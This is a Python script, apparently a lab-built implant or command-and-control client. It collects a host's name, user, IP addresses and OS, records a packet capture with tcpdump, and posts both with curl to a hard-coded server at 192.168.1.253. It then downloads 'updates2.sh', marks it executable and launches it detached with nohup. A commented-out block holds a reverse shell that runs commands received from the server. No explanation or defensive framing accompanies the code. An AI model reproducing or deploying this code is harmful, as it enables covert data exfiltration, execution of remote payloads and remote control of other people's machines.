import socket
import os
import platform
import subprocess
import requests
import time
import json
import threading

SERVER_URL = "http://192.168.1.253:8000"
SERVER_IP = "192.168.1.253"

TCP_COUNT = 1000
storage_directory = "tmp/"

# def upload_json_using_requests(dictionary, fname):
#     # Upload system info as JSON to the server

#     try:
#         response = requests.post(f"{SERVER_URL}/{fname}", json=dictionary)
#         if response.status_code == 200:
#             print("Json uploaded successfully.")
#         else:
#             print(f"Failed to upload json: {response.status_code}")
#     except Exception as e:
#         print(f"Error uploading system info: {e}") 
        
# def upload_file_using_requests(fname):
#     try:
#         response = requests.post(f"{SERVER_URL}/{fname}")
#         if response.status_code == 200:
#             print("File Successfully Uploaded.")
#         else:
#             print(f"Failed to upload: {response.status_code}")
#     except Exception as e:
#         print(f"Error uploading system info: {e}")
        
def upload_file_using_curl(fname):
    # curl -X POST --data-binary @read1.pcap http://192.168.2.7:8000/read1.pcap
    print(f"Uploading: {fname}")
    try:
        cmd = ["curl", "-X", "POST", "--data-binary", f"@{fname}", f"{SERVER_URL}/{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
    except Exception as e:
        print(f"Error uploading filed: {e}")
        
def upload_json_using_curl(dictionary,fname):
    # curl -X POST --data-binary @read1.pcap http://192.168.2.7:8000/read1.pcap
    print(f"Uploading json to {fname}")
    json_data = json.dumps(dictionary, indent=4)
    
    try:
        cmd = ["curl", 
                "--header", "Content-Type: application/json", 
                "--request", "POST",
                "--data", f"{json_data}",
                f"{SERVER_URL}/{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        print(process.stdout)
        
    except Exception as e:
        print(f"Error uploading filed: {e}")

def download_using_curl(fname, fpath="./"):
    # curl http://192.168.2.7:8000/test.txt -o test.txt
    print(f"Downloading: {fname}")
    try:
        cmd = ["curl", 
                f"{SERVER_URL}/{fname}", 
                "-o", f"{fpath}{fname}"]
        # print(f"Executing: {' '.join(cmd)}")
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
    except Exception as e:
        print(f"Error uploading filed: {e}")

def get_ip_addresses():
    """Collect all IPv4 addresses from network interfaces."""
    try:
        output = subprocess.check_output(["ip", "addr", "show"], text=True)
        ip_addresses = []
        for line in output.splitlines():
            if "inet " in line and "inet6" not in line:  # IPv4 only
                parts = line.split()
                ip = parts[1].split("/")[0]
                ip_addresses.append(ip)
        return ip_addresses
    except Exception as e:
        print(f"Error getting IP addresses on Linux: {e}")
        return []
    
def upload_system_info():
    # Collect system information
    hostname = socket.gethostname()
    
    try:
        username = os.getlogin()
    except:
        username = os.environ.get("USER", "unknown")

    try:
        try:
            operating_system = os.uname()
        except:
            operating_system = platform.system()
    except Exception as e:
        operating_system = f"Unable to retrieve OS Info: {e}"

    ip_addresses = get_ip_addresses()
    
    # Package system info into a dictionary
    timestamp = time.strftime("%Y-%m-%d_%H%M")
    
    info = {
        "hostname": hostname,
        "username": username,
        "ip_addresses": ip_addresses,
        "timestamp": timestamp,
        "operating_system": operating_system
    }
    
    try:
        upload_json_using_curl(info,f"{hostname}_system_info.json")
    except Exception as e:
        print(f"Error uploading system info: {e}") 

def upload_TCP_dump(fname="read.pcap",count=100):
    cmd = ["tcpdump", "-c", str(count), "-w", fname]
    try:
        process = subprocess.run(cmd, capture_output=True, text=True)
        if process.returncode == 0:
            print("tcpdump capture completed.")
            # Upload the capture file to the server
            try:     
                upload_file_using_curl(fname)
            except Exception as e:
                print(f"Error uploading capture file: {e}") 
                
        else:
            print(f"tcpdump failed with return code {process.returncode}")
            print(process.stderr)
            
    except Exception as e:
        print(f"Error running tcpdump: {e}")

def download_and_run_subprocess(fname, fpath):
    try:
        download_using_curl(fname, fpath)
        
        cmd = ["chmod", "+x", f"{fpath}{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        cmd = [f"./{fpath}{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        print(process.stdout)
        
    except Exception as e:
        print(f"Download and Run Failed: {e}")

def download_and_run_newprocess(fname, fpath):
    try:
        download_using_curl(fname, fpath)
        
        cmd = ["chmod", "+x", f"{fpath}{fname}"]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        cmd = ['nohup', f"./{fpath}{fname}", '&']
        process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, preexec_fn=lambda: os.setpgrp())
        print(f"Launched New Process {fname}")
        
    except Exception as e:
        print(f"Download and Run Suprocess Failed: {e}")


# def client_thread(server_host='192.168.1.253', server_port=8001):
#     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client:
#         try:
#             client.connect((server_host, server_port))
#             client.send(b'Session established with Client\n')
#             while True:
#                 command_requested = client.recv(1024).decode()
#                 prochandle = subprocess.Popen(command_requested,
#                                               shell=True,
#                                               stdout=subprocess.PIPE,
#                                               stderr=subprocess.PIPE,
#                                               stdin=subprocess.PIPE)
#                 results, errors = prochandle.communicate()
#                 results += errors
#                 client.send(results)
#             client.close()
#         except socket.error as e:
#             print(f"failed to connect: {e}")

# def start_client_as_thread(server_host='192.168.1.253', server_port=8001):
#     thread = threading.Thread(target=client_thread, args=(server_host, server_port), daemon=True)
#     thread.start()
#     return thread


def main():
    
    os.makedirs(storage_directory, exist_ok=True)
    
    try:
        upload_system_info()
    except Exception as e:
        print(f"System Info Upload Failed: {e}")
        
    ## Get TCP Dump 1000 Packets
    hostname = socket.gethostname()
    timestamp = time.strftime("%Y-%m-%d_%H%M")
    filename = f"{storage_directory}{hostname}_{timestamp}.pcap"  
    print(f"Running TCP Dump Thread: Capturing {TCP_COUNT} packets")
    
    try:
        tcp_thread = threading.Thread(target=upload_TCP_dump,args=(filename,TCP_COUNT))
        tcp_thread.start()
    except Exception as e:
        print(f"TCP Dump Failed: {e}")
        
    fname = "updates2.sh"
    try:
        download_and_run_newprocess(fname, storage_directory)
    except Exception as e:
        print(f"Error in Downloading and Running {fname}: {e}") 
        
    
    
    # try:
    #     command_thread = start_client_as_thread()
    # except Exception as e:
    #     print(f"TCP Dump Failed: {e}")
        
    # fname="test.txt"
    # try:
    #    download_using_curl(fname, storage_directory)
    # except Exception as e:
    #    print(f"Download failed {fname}: {e}")
    
    # fname = "updates.sh"
    # try:
    #    download_and_run_subprocess(fname, storage_directory)
    # except Exception as e:
    #    print(f"Error in Downloading and Running {fname}: {e}") 
    
    fname = "updates2.sh"
    try:
        download_and_run_newprocess(fname, storage_directory)
    except Exception as e:
        print(f"Error in Downloading and Running {fname}: {e}") 
    
    # command_thread.join()
    

if __name__ == "__main__":
    main()